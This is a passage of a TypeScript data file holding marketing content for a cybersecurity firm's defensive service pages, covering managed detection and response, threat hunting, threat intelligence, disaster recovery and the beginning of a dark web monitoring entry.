export interface SubServiceDetail {
  category: "offensive" | "defensive" | "grc" | "dpdp" | "training" | "ai";
  categoryTitle: string;
  id: string;
  slug: string;
  title: string;
  navTitle: string;
  badge: string;
  tagline: string;
  heroSummary: string;
  promise: string;
  metrics: { value: string; label: string; sub?: string }[];
  frameworks: string[];
  whyItMatters: {
    title: string;
    description: string;
    points: { headline: string; detail: string }[];
  };
  vectors: {
    category: string;
    description: string;
    capabilities: string[];
  }[];
  lifecycle: {
    step: string;
    phase: string;
    title: string;
    description: string;
    activities: string[];
  }[];
  deliverables: {
    title: string;
    format: string;
    audience: string;
    description: string;
  }[];
  engagementModels: {
    name: string;
    suitableFor: string;
    description: string;
  }[];
  faqs: {
    question: string;
    answer: string;
  }[];
}

/* ------------------------------------------------------------------ */
/* Import existing offensive services and map them to unified format   */
/* ------------------------------------------------------------------ */
import { OFFENSIVE_SERVICES } from "./offensiveServices";

const offensiveConverted: SubServiceDetail[] = OFFENSIVE_SERVICES.map((s) => ({
  ...s,
  category: "offensive",
  categoryTitle: "Offensive Security",
}));

/* ------------------------------------------------------------------ */
/* Defensive Security Subservices                                     */
/* ------------------------------------------------------------------ */
const DEFENSIVE_SERVICES: SubServiceDetail[] = [
  {
    category: "defensive",
    categoryTitle: "Defensive Security",
    id: "mdr",
    slug: "managed-detection-and-response",
    title: "Managed Detection & Response (MDR / SOC)",
    navTitle: "Managed Detection & Response",
    badge: "24/7/365 Global SOC",
    tagline: "Round-the-Clock Threat Monitoring, AI Correlation, and Rapid Host Containment.",
    heroSummary:
      "Enterprise 24/7 Managed Detection and Response powered by seasoned SOC analysts and advanced telemetry correlation. We ingest endpoint, cloud, network, and identity events to detect adversary dwell time within minutes and execute automated isolation playbooks.",
    promise: "Sub-15 Minute Triage & Guaranteed Mean Time to Contain (MTTC)",
    metrics: [
      { value: "24/7/365", label: "Active SOC Coverage", sub: "Global multi-tier team" },
      { value: "< 15 Mins", label: "Triage SLA", sub: "Critical incident alerts" },
      { value: "99.9%", label: "Noise Reduction", sub: "False positive filtering" },
      { value: "1-Click", label: "Remote Containment", sub: "Host isolation & kill switch" },
    ],
    frameworks: ["NIST CSF 2.0 (Detect & Respond)", "MITRE D3FEND", "ISO 27035 (Incident Management)", "SOC 2 Type II"],
    whyItMatters: {
      title: "Attackers Move in Hours. Traditional Teams React in Days.",
      description:
        "The average dwell time for modern ransomware operators is under 48 hours. Without 24/7 live analyst monitoring, intrusions occurring during weekends or holidays go completely undetected until data is encrypted.",
      points: [
        {
          headline: "Eliminate Security Alert Fatigue",
          detail: "Our proprietary correlation engine and expert analysts filter through millions of daily raw logs, delivering only high-fidelity, verified incidents.",
        },
        {
          headline: "Immediate Host & Identity Containment",
          detail: "Automated and analyst-approved playbooks disconnect compromised endpoints, revoke compromised SSO tokens, and block malicious IPs instantly.",
        },
        {
          headline: "Turnkey Enterprise SIEM/XDR Management",
          detail: "No need to build an expensive in-house 24/7 SOC; leverage our certified analysts across Microsoft Sentinel, Splunk, CrowdStrike, and Cortex.",
        },
      ],
    },
    vectors: [
      {
        category: "Endpoint Telemetry & Behavioral XDR",
        description: "Continuous process execution, memory injection, and persistence mechanism monitoring across workstations and servers.",
        capabilities: [
          "Process hollowing and parent-child anomaly detection",
          "LSASS memory reading and credential dumping defense",
          "Automated file quarantine and malicious process termination",
          "Script-block logging analysis (PowerShell, WMI, Bash)",
        ],
      },
      {
        category: "Cloud Infrastructure & Identity Telemetry",
        description: "Monitoring Azure AD / Entra ID, AWS CloudTrail, Google Cloud Audit, and Okta SSO authentication logs.",
        capabilities: [
          "Impossible travel and token replay anomaly alerts",
          "Mass cloud storage download and deletion triggers",
          "Privileged IAM role assumption and backdoor creation alerts",
          "OAuth malicious consent grant detection",
        ],
      },
      {
        category: "Network & Perimeter Threat Correlation",
        description: "Deep packet and flow telemetry inspection across firewalls, VPN gateways, and proxies.",
        capabilities: [
          "Adversary C2 beaconing detection over HTTPS and DNS",
          "Rogue internal port scans and lateral SMB propagation",
          "Suspicious external inbound brute force and exploit attempts",
          "Tor exit node and dark web IP connection interception",
        ],
      },
      {
        category: "Threat Intelligence & IoC Enrichment",
        description: "Enriching every incoming alert with real-time indicators of compromise from private global feeds.",
        capabilities: [
          "Automated reputation lookups on hashes, domains, and IPs",
          "Threat actor attribution and campaign pattern matching",
          "Contextual sandbox dynamic malware detonation",
          "Custom sigma rule creation based on newly emerging CVEs",
        ],
      },
    ],
    lifecycle: [
      {
        step: "01",
        phase: "Sensor Deployment & Ingestion",
        title: "Telemetry Architecture Integration",
        description: "Deploying endpoint agents, configuring cloud audit connectors, and establishing high-speed syslog pipelines into the SIEM.",
        activities: ["SIEM connector authorization", "EDR policy alignment", "Log parsing verification"],
      },
      {
        step: "02",
        phase: "Baseline Calibration & Rule Tuning",
        title: "Noise Reduction & Anomaly Baselining",
        description: "Mapping your normal administrative behaviors and business hours to eliminate false alarms and establish high-fidelity alert thresholds.",
        activities: ["Whitelisting legitimate corporate apps", "Custom correlation rule authoring", "SOC escalation matrix sign-off"],
      },
      {
        step: "03",
        phase: "24/7 Continuous Monitoring",
        title: "Live Threat Triage & Investigation",
        description: "Our multi-tiered SOC monitors alerts round-the-clock, investigating anomalies, validating indicators, and assembling incident context.",
        activities: ["24/7 eyes-on-glass triage", "Memory and process artifact forensics", "Attacker objective determination"],
      },
      {
        step: "04",
        phase: "Rapid Containment & Escalation",
        title: "Surgical Incident Response",
        description: "Executing automated host isolation, revoking active sessions, and telephoning your incident response lead within 15 minutes of verified breach.",
        activities: ["Host network isolation", "Firewall egress IP blocking", "Real-time client bridge establishment"],
      },
      {
        step: "05",
        phase: "Root Cause & Posture Hardening",
        title: "Eradication & Rule Optimization",
        description: "Evicting persistence mechanisms, issuing post-incident root cause forensics, and tuning detection engineering rules.",
        activities: ["Persistence artifact removal", "Executive incident report delivery", "Detection rule reinforcement"],
      },
    ],
    deliverables: [
      {
        title: "Live 24/7 Executive Telemetry Portal",
        format: "Web Dashboard + Mobile Alerts",
        audience: "CISO, Head of IT, SOC Leads",
        description: "Real-time visibility into active alerts, mean time to triage (MTTT), mean time to contain (MTTC), and protected asset health.",
      },
      {
        title: "Monthly Defensive Efficacy Dossier",
        format: "Comprehensive PDF Report",
        audience: "Risk Committee, CIO, Executive Team",
        description: "Detailed monthly breakdown of blocked intrusions, threat origin metrics, top targeted users, and infrastructure hardening suggestions.",
      },
      {
        title: "Emergency Incident Forensic Report",
        format: "Formal Technical & Regulatory PDF",
        audience: "Legal Counsel, Regulators, Insurance Carriers",
        description: "Complete timestamped evidence dossier generated following critical incidents, satisfying regulatory reporting mandates.",
      },
    ],
    engagementModels: [
      {
        name: "24/7 Complete Managed MDR Retainer",
        suitableFor: "Mid-market to large enterprises needing comprehensive 24/7 SOC coverage",
        description: "Continuous monitoring, active containment, proactive threat hunting, and dedicated technical account management.",
      },
      {
        name: "Co-Managed SOC / Hybrid Tier-2 Escalation",
        suitableFor: "Enterprises with an internal daytime security team needing overnight & weekend coverage",
        description: "Seamless collaboration with internal analysts; handling overnight alerts and deep forensic escalations.",
      },
      {
        name: "Cloud-Native Workload MDR",
        suitableFor: "Cloud-first companies operating primarily on AWS, Azure, GCP, and Kubernetes",
        description: "Specialized monitoring tailored for container anomalies, cloud IAM abuse, and serverless attack vectors.",
      },
    ],
    faqs: [
      {
        question: "Can Envista MDR isolate an infected endpoint automatically without waiting for our approval?",
        answer: "Yes, if agreed upon in our pre-authorized Rules of Engagement. For critical ransomware and active C2 alerts, our playbooks can immediately isolate the host from the network while preserving live telemetry for forensics, stopping lateral spread instantly.",
      },
      {
        question: "Do we have to replace our existing EDR and SIEM tools?",
        answer: "No. Envista is technology-agnostic. We integrate natively with your existing investments in Microsoft Sentinel, CrowdStrike Falcon, SentinelOne, Splunk, Palo Alto Cortex, Datadog, or Elastic.",
      },
      {
        question: "What is your guaranteed response time SLA for critical incidents?",
        answer: "We guarantee an initial triage and containment initiation SLA of under 15 minutes for verified critical threats, 24 hours a day, 365 days a year.",
      },
    ],
  },
  {
    category: "defensive",
    categoryTitle: "Defensive Security",
    id: "threat-hunting",
    slug: "threat-hunting-services",
    title: "Proactive Threat Hunting Services",
    navTitle: "Threat Hunting Services",
    badge: "Adversary Evasion Discovery",
    tagline: "Hunt Down Dormant Adversaries, Hidden Implants, and Advanced Evasion Tactics.",
    heroSummary:
      "Hypothesis-driven deep-dive investigations into your internal endpoints, cloud logs, and network traffic. Our threat hunters search for state-sponsored actors, living-off-the-land (LotL) persistence, and stealthy supply-chain compromises that bypassed automated defenses.",
    promise: "Assume Breach: Uncovering What Automated Scanners Missed",
    metrics: [
      { value: "Hypothesis", label: "Intelligence-Driven", sub: "Actor TTP alignment" },
      { value: "0-Log", label: "Detection Evasion Bypassed", sub: "Deep memory forensics" },
      { value: "Sigma", label: "Custom Detection Packs", sub: "Permanent hardening" },
      { value: "100%", label: "Live Memory Sweeps", sub: "In-memory malware discovery" },
    ],
    frameworks: ["MITRE ATT&CK", "NIST SP 800-86", "SANS FOR508", "The Threat Hunting Project (TaHiTI)"],
    whyItMatters: {
      title: "Attackers Live in Memory and Use Built-in Admin Tools",
      description:
        "Modern threat actors avoid dropping recognizable malware binaries. Instead, they leverage PowerShell, WMI, and legitimate admin tools (Living-off-the-Land), blending into daily operations without triggering traditional antivirus alarms.",
      points: [
        {
          headline: "Discover Dormant Persistence Mechanisms",
          detail: "Locate hidden scheduled tasks, modified registry run keys, malicious WMI event subscriptions, and backdoored DLLs.",
        },
        {
          headline: "Validate Post-Incident Cleanliness",
          detail: "Verify whether past remediation efforts truly eradicated the adversary or left lingering secondary backdoors.",
        },
        {
          headline: "Produce Long-Term Detection Engineering Rules",
          detail: "Translate discovered attack patterns into custom Sigma and YARA rules that continuously protect your SIEM going forward.",
        },
      ],
    },
    vectors: [
      {
        category: "Host Memory & Volatile Artifact Analysis",
        description: "Deep inspection of running process memory, injected threads, and unbacked executable memory regions.",
        capabilities: [
          "Reflective DLL injection & hollowed process detection",
          "Hooked API functions and unhooked system call bypasses",
          "Direct kernel object manipulation (DKOM) identification",
          "Extracting injected shellcode beacons from memory",
        ],
      },
      {
        category: "Persistence & Privilege Escalation Audit",
        description: "Systematic auditing of non-standard auto-start entry points across all domain workstations and servers.",
        capabilities: [
          "Hidden scheduled tasks and malicious service creations",
          "Active Directory AdminSDHolder and ACL backdoors",
          "Golden/Silver ticket and Kerberos ticket lifetime abuse",
          "BITS job and COM hijack persistence hunting",
        ],
      },
      {
        category: "Network Outlier & Beaconing Analytics",
        description: "Statistical analysis of long-tail network connections to identify low-and-slow command and control.",
        capabilities: [
          "Jitter and frequency analysis on recurring outbound connections",
          "DNS query entropy analysis for data tunneling detection",
          "TLS certificate SNI and JA3/JA4 fingerprinting",
          "Unusual administrative remote protocols (RDP, WinRM, SSH) spikes",
        ],
      },
      {
        category: "Cloud Control Plane & Identity Hunting",
        description: "Hunting for unauthorized service principals, dormant API keys, and anomalous IAM assumption chains.",
        capabilities: [
          "Dormant guest user and external collaboration token abuse",
          "Cloud instance metadata service (IMDS) token theft traces",
          "Unauthorized multi-factor authentication device registrations",
          "Cross-tenant data staging in cloud storage buckets",
        ],
      },
    ],
    lifecycle: [
      {
        step: "01",
        phase: "Threat Hypothesis Formulation",
        title: "Intelligence & Actor Modeling",
        description: "Formulating specific hunting hypotheses based on recent geopolitical campaigns, new zero-days, or specific threat groups.",
        activities: ["Threat intel briefing review", "Hypothesis matrix creation", "Target asset tiering"],
      },
      {
        step: "02",
        phase: "Targeted Forensic Collection",
        title: "Endpoint & Log Sweep",
        description: "Executing non-intrusive memory sweeps, MFT parsing, and prefetch timeline extractions using enterprise forensic orchestrators.",
        activities: ["Memory triage artifact collection", "Event log consolidation", "Forensic baseline extraction"],
      },
      {
        step: "03",
        phase: "Anomaly Analytics & Correlation",
        title: "Deep Behavioral Inspection",
        description: "Filtering out verified baseline behavior to isolate true statistical outliers, unbacked code executions, and rare parent-child processes.",
        activities: ["Frequency-of-occurrence analysis", "Known-good whitelisting", "Suspicious binary decompilation"],
      },
      {
        step: "04",
        phase: "Adversary Confirmation & Eviction",
        title: "Threat Containment",
        description: "Collaborating with your response teams to immediately neutralize and isolate identified implants and credentials.",
        activities: ["Host isolation", "Active session revocation", "Malicious artifact forensic preservation"],
      },
      {
        step: "05",
        phase: "Detection Engineering Handoff",
        title: "Rule Integration & Board Debrief",
        description: "Authoring tailored Sigma, KQL, or Splunk SPL detection rules ensuring identical future behaviors trigger immediate automated alerts.",
        activities: ["Custom Sigma rule authoring", "SOC playbook documentation", "Executive hunt report delivery"],
      },
    ],
    deliverables: [
      {
        title: "Comprehensive Threat Hunt Dossier",
        format: "Technical Forensic PDF",
        audience: "CISO, Head of SOC, Incident Response Leads",
        description: "Complete breakdown of all tested hypotheses, analyzed telemetry volumes, discovered anomalies, and remediation steps.",
      },
      {
        title: "Production-Ready Detection Rule Pack",
        format: "Sigma / KQL / Splunk SPL Rules",
        audience: "SOC Detection Engineers",
        description: "Custom detection logic crafted to detect the exact techniques investigated during the hunt within your internal SIEM.",
      },
      {
        title: "Executive Compromise Assessment Certificate",
        format: "Official Signed PDF",
        audience: "Board of Directors, M&A Committees, Regulators",
        description: "Independent attestation verifying that an exhaustive forensic compromise hunt was conducted with no active APT compromise identified.",
      },
    ],
    engagementModels: [
      {
        name: "Quarterly Scheduled Compromise Hunt",
        suitableFor: "Regulated institutions seeking proactive assurance between major audit cycles",
        description: "Four deep-dive forensic hunts per year focusing on newly emerging APT campaigns and zero-days.",
      },
      {
        name: "M&A Due Diligence / Pre-Acquisition Audit",
        suitableFor: "Private equity and enterprises acquiring third-party technology environments",
        description: "Rapid 2-week comprehensive compromise assessment ensuring the target network is not actively backdoored.",
      },
      {
        name: "Post-Incident Forensic Assurance",
        suitableFor: "Organizations that experienced a past breach and require verification of full eviction",
        description: "Exhaustive validation that all adversary persistence footholds and secondary beacons have been eradicated.",
      },
    ],
    faqs: [
      {
        question: "How is Threat Hunting different from automated Managed Detection & Response (MDR)?",
        answer: "MDR is reactive—it alerts on known signatures and predefined behavioral thresholds. Threat Hunting is proactive and assumes compromise—expert analysts formulate hypotheses and manually investigate deep memory, logs, and artifacts to find stealthy adversaries that evaded automated alerts.",
      },
      {
        question: "Will the hunt interfere with daily employee productivity or network traffic?",
        answer: "No. Forensic artifacts are extracted using lightweight, non-intrusive agents and read-only telemetry queries with strict CPU throttling (under 5%), ensuring zero user impact.",
      },
      {
        question: "What happens if you find an active ransomware operator during the hunt?",
        answer: "We immediately declare an emergency incident and activate our Incident Response escalation protocol, providing immediate containment assistance to prevent data destruction.",
      },
    ],
  },
  {
    category: "defensive",
    categoryTitle: "Defensive Security",
    id: "threat-intel",
    slug: "threat-intelligence-services",
    title: "Threat Intelligence Services",
    navTitle: "Threat Intelligence Services",
    badge: "Strategic & Tactical Cyber Recon",
    tagline: "Actionable Adversary Telemetry Tailored to Your Industry, Tech Stack, and Geography.",
    heroSummary:
      "Contextual cyber threat intelligence delivering curated, actionable telemetry on threat actor syndicates, active zero-day exploit campaigns, and emerging TTPs targeting your specific sector, geography, and enterprise technologies.",
    promise: "Contextual Actionable Intelligence Over Generic Raw Data",
    metrics: [
      { value: "Real-Time", label: "Zero-Day Exploit Alerts", sub: "Pre-patch advisories" },
      { value: "STIX / TAXII", label: "Automated SIEM Feeds", sub: "Machine-readable IoCs" },
      { value: "Attribution", label: "APT Syndicate Tracking", sub: "Nation-state & ransomware" },
      { value: "Weekly", label: "Executive Threat Briefs", sub: "Strategic risk forecasts" },
    ],
    frameworks: ["MITRE ATT&CK", "NIST SP 800-150", "Diamond Model of Intrusion Analysis", "STIX 2.1 / TAXII 2.1"],
    whyItMatters: {
      title: "Raw Threat Feeds Create Noise. Curated Intelligence Enables Defense.",
      description:
        "Subscribing to generic feeds results in millions of irrelevant IP addresses that overwhelm firewalls. Organizations need customized threat intelligence that tracks actors specifically targeting their industry, supply chain, and tech stack.",
      points: [
        {
          headline: "Pre-Emptive Patching of Actively Exploited CVEs",
          detail: "Identify which vulnerabilities in your technology stack are currently weaponized by ransomware syndicates before public advisories appear.",
        },
        {
          headline: "Actionable Machine-Readable IoCs for Firewalls & SIEM",
          detail: "Automatically ingest high-confidence malicious IPs, domains, and file hashes directly into your firewall blocklists and EDR filters.",
        },
        {
          headline: "Strategic Board & Executive Advisory",
          detail: "Brief leadership on geopolitical cyber threats, ransomware extortion trends, and regulatory enforcement patterns impacting your business.",
        },
      ],
    },
    vectors: [
      {
        category: "Strategic Threat Intelligence",
        description: "Macro-level analysis of threat actor motivations, geopolitical cyber operations, and industry-specific targeting trends.",
        capabilities: [
          "Quarterly CISO and Board threat briefings",
          "Ransomware cartel payment and leak trends",
          "Nation-state cyber espionage geopolitical impact forecasts",
          "Industry benchmark threat exposure scoring",
        ],
      },
      {
        category: "Tactical & Operational IoC Feeds",
        description: "Machine-readable threat feeds validated by human intelligence analysts to eliminate false blocklists.",
        capabilities: [
          "Active C2 server IP addresses and bulletproof hosting trackers",
          "Malicious phishing domain and typo-squatted asset feeds",
          "Malware binary hashes (SHA-256) with behavioral sandbox reports",
          "Automated integration via STIX/TAXII into firewalls and SIEMs",
        ],
      },
      {
        category: "Vulnerability & Zero-Day Early Warning",
        description: "Tracking dark web exploit exchanges, proof-of-concept weaponization, and active scanning campaigns.",
        capabilities: [
          "Flash alerts on critical zero-days within hours of discovery",
          "Exploitation prediction scoring (EPSS) correlation",
          "Compensating firewall and WAF virtual patching rules",
          "Supply-chain third-party library vulnerability alerts",
        ],
      },
      {
        category: "Sector & Supply-Chain Targeted Telemetry",
        description: "Monitoring adversaries targeting your banking, manufacturing, healthcare, or government sector.",
        capabilities: [
          "Tracking threat actors specializing in your vertical",
          "Vendor and partner breach notification alerts",
          "Stolen enterprise credentials matching corporate domains",
          "Executive impersonation and VIP threat tracking",
        ],
      },
    ],
    lifecycle: [
      {
        step: "01",
        phase: "Priority Intelligence Requirements (PIR)",
        title: "Stakeholder Alignment",
        description: "Defining your core crown jewels, digital footprint, critical technologies, and key geopolitical regions of operation.",
        activities: ["Technology stack profiling", "Key asset identification", "PIR documentation"],
      },
      {
        step: "02",
        phase: "Multi-Source Collection",
        title: "Global Sensor Ingestion",
        description: "Gathering telemetry across underground darknet forums, private intelligence sharing groups, telemetry honeypots, and malware sandboxes.",
        activities: ["Dark web forum monitoring", "Malware sample dynamic detonation", "Global sensor telemetry ingestion"],
      },
      {
        step: "03",
        phase: "Expert Processing & Attribution",
        title: "Human Analyst Verification",
        description: "Intelligence officers verify raw indicators, eliminate duplicate noise, and attribute campaigns to specific threat syndicates.",
        activities: ["Threat actor attribution", "Campaign infrastructure mapping", "Confidence scoring"],
      },
      {
        step: "04",
        phase: "Dissemination & Automated Ingestion",
        title: "Feed Delivery & Flash Alerts",
        description: "Pushing verified IoCs directly into client firewalls and delivering executive summaries and flash advisories.",
        activities: ["STIX/TAXII automated ingestion", "Flash email alerts for critical zero-days", "Weekly curated digest distribution"],
      },
      {
        step: "05",
        phase: "Defensive Feedback Loop",
        title: "Rule Tuning & PIR Recalibration",
        description: "Measuring the efficacy of ingested indicators and tuning defensive detection rules based on real-world threat shifts.",
        activities: ["SIEM hit-rate validation", "Firewall block metric review", "PIR quarterly revision"],
      },
    ],
    deliverables: [
      {
        title: "Weekly Tailored Intelligence Digest",
        format: "Curated PDF + Portal Access",
        audience: "Security Engineers, IT Leadership",
        description: "Deep technical analysis of relevant threats, active CVE weaponization, and actionable defensive countermeasures.",
      },
      {
        title: "Critical Flash Threat Advisories",
        format: "Urgent Email / SMS Alerts (< 2 hours from zero-day)",
        audience: "CISO, Head of Infrastructure, SOC Incident Leads",
        description: "Emergency technical briefing on newly disclosed, actively exploited vulnerabilities with immediate mitigation WAF/firewall rules.",
      },
      {
        title: "Machine-Readable STIX/TAXII Feeds",
        format: "Automated API Stream",
        audience: "Firewalls, Proxies, SIEM, SOAR, EDR",
        description: "High-confidence IoC stream formatted for automatic blocklist ingestion without manual intervention.",
      },
    ],
    engagementModels: [
      {
        name: "Annual Threat Intelligence Subscription",
        suitableFor: "Enterprises needing daily automated feeds, weekly digests, and flash zero-day alerts",
        description: "Continuous feed integration, customized PIR monitoring, and monthly threat briefings.",
      },
      {
        name: "Bespoke Threat Actor Dossier / Investigation",
        suitableFor: "Organizations suspecting targeted surveillance or specific syndicate harassment",
        description: "Deep-dive investigative report profiling a specific adversary, infrastructure, and intent.",
      },
      {
        name: "Executive & VIP Threat Intelligence Briefing",
        suitableFor: "Board members and executive leadership teams",
        description: "High-level strategic presentation translating technical cyber threats into business and financial risks.",
      },
    ],
    faqs: [
      {
        question: "How do you ensure threat feeds don't cause false-positive blocks on our corporate firewalls?",
        answer: "Every indicator in our high-confidence feed undergoes automated multi-source verification and human analyst review. We assign strict confidence thresholds and automatically age-out transient IPs to prevent blocking legitimate infrastructure.",
      },
      {
        question: "Can your feeds integrate directly with our Palo Alto / Fortinet / Microsoft Sentinel setup?",
        answer: "Yes. Our threat intelligence feeds support open standards including STIX 2.1, TAXII, JSON, and CSV, integrating seamlessly with all major firewall, proxy, and SIEM vendors.",
      },
      {
        question: "What is a Critical Flash Advisory?",
        answer: "When a zero-day vulnerability affecting enterprise software (e.g. VMware, Microsoft Exchange, Citrix, Cisco) is weaponized in the wild, we issue a Flash Advisory within hours detailing safe mitigation workarounds and detection queries before official vendor patches are released.",
      },
    ],
  },
  {
    category: "defensive",
    categoryTitle: "Defensive Security",
    id: "disaster-recovery",
    slug: "disaster-recovery-consulting",
    title: "Disaster Recovery Consulting & Cyber Resilience",
    navTitle: "Disaster Recovery Consulting",
    badge: "Business Continuity & Air-Gap Defense",
    tagline: "Ensure Your Business Survives Catastrophic Ransomware and Infrastructure Failures.",
    heroSummary:
      "Strategic disaster recovery architecture, immutable air-gapped backup validation, and executive tabletop crisis simulations. We ensure your critical enterprise operations can recover within minutes of catastrophic ransomware extortion or datastore wiping.",
    promise: "Mathematically Validated Recovery Time & Point Objectives (RTO / RPO)",
    metrics: [
      { value: "RTO / RPO", label: "Empirically Verified", sub: "Live failover drills" },
      { value: "Air-Gapped", label: "Immutable Backups", sub: "WORM storage validation" },
      { value: "0-Ransom", label: "Guaranteed Recovery", sub: "Restore without paying" },
      { value: "Tabletop", label: "Executive Crisis Simulation", sub: "Board & legal war games" },
    ],
    frameworks: ["ISO 22301 (Business Continuity)", "NIST SP 800-34", "RBI BCP / DR Guidelines", "SEBI CSCRF BCP Framework"],
    whyItMatters: {
      title: "Ransomware Cartels Target Backups First",
      description:
        "Modern ransomware operators spend days locating and wiping online backups, cloud snapshots, and Active Directory recovery points before encrypting production servers. Having backups is meaningless unless they are immutable and tested under real crisis conditions.",
      points: [
        {
          headline: "Validate True Air-Gapped Immutability",
          detail: "Verify whether compromised Domain Administrator or Cloud Root credentials can delete or overwrite your backup datastores.",
        },
        {
          headline: "Meet Strict Banking & Regulatory BCP Mandates",
          detail: "Satisfy rigorous disaster recovery testing mandates required under RBI, SEBI CSCRF, and ISO 22301.",
        },
        {
          headline: "Executive Crisis Preparedness Through War-Games",
          detail: "Train executive leadership, legal counsel, and PR teams on ransom negotiation regulations, disclosure timing, and incident communication.",
        },
      ],
    },
    vectors: [
      {
        category: "Immutable Backup & Storage Security",
        description: "Auditing backup infrastructure against administrative tampering, deletion, and encryption.",
        capabilities: [
          "WORM (Write Once, Read Many) compliance verification",
          "Air-gapped architecture isolation and out-of-band management",
          "Backup server Active Directory isolation (dedicated authentication domain)",
          "Cloud immutable snapshot retention policy testing",
        ],
      },
      {
        category: "RTO & RPO Engineering and Live Failover",
        description: "Benchmarking Recovery Time Objectives (RTO) and Recovery Point Objectives (RPO) against real-world business tolerances.",
        capabilities: [
          "Database transaction log replay and consistency checks",
          "Automated cloud secondary region spin-up drills",
          "Network BGP route swing and DNS failover testing",
          "Active Directory bare-metal recovery runbook validation",
        ],
      },
      {
        category: "Executive Crisis Simulation & War Games",
        description: "Simulating high-stakes cyber crises with the Board of Directors, legal counsel, and executive officers.",
        capabilities: [
          "Double-extortion ransomware negotiation scenario drills",
          "Regulatory reporting deadlines simulation (CERT-In 6-hour window)",
          "Customer communication and press release leak handling",
          "Legal liability and cyber insurance claim coordination",
        ],
      },
      {
        category: "Operational Dependency & Tiering Matrix",
        description: "Mapping application interdependencies to determine exact sequential restoration priorities.",
        capabilities: [
          "Crown-jewel dependency mapping (identity -> network -> databases -> apps)",
          "Tier-1, Tier-2, and Tier-3 service classification",
          "Third-party SaaS dependency contingency planning",
          "Manual offline operation fallback procedure drafting",
        ],
      },
    ],
    lifecycle: [
      {
        step: "01",
        phase: "Business Impact Analysis (BIA)",
        title: "Criticality Mapping",
        description: "Engaging business unit leaders to calculate the financial and operational cost of downtime per hour across critical applications.",
        activities: ["BIA interview workshops", "Financial impact modeling", "RTO/RPO target calibration"],
      },
      {
        step: "02",
        phase: "Architecture & Air-Gap Audit",
        title: "Technical Resilience Review",
        description: "Inspecting backup storage topologies, credential separation, replication latencies, and network segmentation.",
        activities: ["Backup architecture review", "Credential isolation verification", "Immutability policy validation"],
      },
      {
        step: "03",
        phase: "Live Recovery Drill",
        title: "Hands-On Restoration Exercise",
        description: "Simulating a complete datacenter or cloud tenant loss and restoring critical core services into an isolated environment.",
        activities: ["Bare-metal server restoration", "Database integrity verification", "Empirical RTO clock timing"],
      },
      {
        step: "04",
        phase: "Tabletop Crisis Simulation",
        title: "Executive War Game",
        description: "Facilitating a dynamic, scenario-driven crisis exercise with executive leadership, legal counsel, and communication heads.",
        activities: ["Ransomware extortion decision tree", "Regulatory reporting drill", "Emergency communication testing"],
      },
      {
        step: "05",
        phase: "Runbook Engineering & Certification",
        title: "Living DR Playbooks & Attestation",
        description: "Delivering step-by-step restoration runbooks and formal compliance attestation reports for regulators and insurers.",
        activities: ["Step-by-step runbook delivery", "Executive BCP scorecards", "Annual DR certificate issuance"],
      },
    ],
    deliverables: [
      {
        title: "Business Continuity & DR Strategy Master Plan",
        format: "Comprehensive Governance Manual",
        audience: "CISO, CIO, Risk Committee, Board",
        description: "Authoritative architectural blueprint defining recovery tiering, air-gap topologies, and statutory compliance frameworks.",
      },
      {
        title: "Technical Disaster Recovery Runbooks",
        format: "Step-by-Step Engineering Manuals",
        audience: "IT Infrastructure, Database Administrators, Cloud Engineers",
        description: "Granular command-line and operational restoration procedures for rebuilding Active Directory, cloud networks, and databases from bare metal.",
      },
      {
        title: "Disaster Recovery Drill Attestation Report",
        format: "Official Signed Audit Certificate",
        audience: "Regulators (RBI, SEBI), Cyber Insurers, Enterprise Clients",
        description: "Formal certification confirming that live recovery drills were executed and verified within statutory RTO/RPO limits.",
      },
    ],
    engagementModels: [
      {
        name: "Full-Scope DR Transformation & Audit",
        suitableFor: "Enterprises overhauling their disaster recovery posture for cloud and hybrid environments",
        description: "End-to-end BIA, architecture redesign, live recovery drill, and executive tabletop crisis simulation.",
      },
      {
        name: "Annual Mandated DR Drill & Certification",
        suitableFor: "Financial institutions and regulated entities requiring annual third-party DR validation",
        description: "Independent observation, timing, and certification of scheduled live disaster recovery switchovers.",
      },
      {
        name: "Executive Crisis Tabletop Exercise",
        suitableFor: "Board members and C-suite leadership",
        description: "Half-day simulated crisis scenario testing decision-making, communications, and legal compliance under attack.",
      },
    ],
    faqs: [
      {
        question: "How do we know if our backups are truly safe from modern ransomware?",
        answer: "We perform an offline audit: our offensive researchers test whether an attacker with compromised Domain Admin or Cloud Root privileges can disable snapshots, delete retention locks, or access backup storage. If storage utilizes true immutable WORM policies with out-of-band authentication, recovery is guaranteed.",
      },
      {
        question: "What is the difference between RTO and RPO?",
        answer: "RTO (Recovery Time Objective) is the maximum acceptable duration of downtime before systems must be back online. RPO (Recovery Point Objective) is the maximum acceptable amount of data loss measured in time (e.g. 15 minutes of transaction logs).",
      },
      {
        question: "Does Envista conduct live failover drills during production hours?",
        answer: "Drills are calibrated to client risk tolerances. Live failovers are typically conducted during scheduled weekend maintenance windows, or executed in an isolated clone environment to benchmark recovery speed with zero live production risk.",
      },
    ],
  },
  {
    category: "defensive",
    categoryTitle: "Defensive Security",
    id: "dark-web-monitoring",
    slug: "brand-risk-and-dark-web-monitoring",
    title: "Brand Risk & Dark Web Monitoring",
    navTitle: "Brand Risk & Dark Web Monitoring",
    badge: "External Attack Surface Radar",
    tagline: "Scour Underground Marketplaces for Stolen Credentials, VIP Doxxing, and Brand Abuse.",
    heroSummary:
      "Continuous automated and human-led surveillance of Tor hidden services, Telegram breach channels, illicit paste sites, and cybercrime forums. We identify leaked employee credentials, compromised VIP accounts, and fake brand phishing domains before they are weaponized.",
    promise: "Pre-Emptive External Radar: Detecting Exposures Outside Your Perimeter",
    metrics: [
      { value: "24/7", label: "Dark Web Surveillance", sub: "Tor, I2P & Telegram" },
      { value: "< 2 Hours", label: "Credential Leak Triage", sub: "Immediate forced reset" },
      { value: "Takedown", label: "Phishing Domain Eviction", sub: "Global registrar network" },
      { value: "VIP", label: "Executive Identity Shield", sub: "Personal email & phone dox" },
    ],
    frameworks: ["NIST Special Publication 800-137", "CIS Control 16 (Account Monitoring)", "FIRST Best Practices", "ISO 27001 (Threat Intelligence)"],
    whyItMatters: {
      title: "Your Perimeter Doesn't Stop at Your Firewalls",
      description:
        "Over 60% of corporate breaches originate from infostealer malware (RedLine, Lumma, Vidar) infecting an employee's personal device or third-party contractor, with active session cookies and passwords auctioned on Russian-language darknet markets.",
      points: [
        {
          headline: "Intercept Stolen Session Cookies & Passwords",
          detail: "Detect compromised enterprise credentials within hours of infostealer botnet auctions, allowing immediate session invalidation before initial access occurs.",
        },
        {
          headline: "Rapid Takedown of Phishing Domains & Fake Apps",
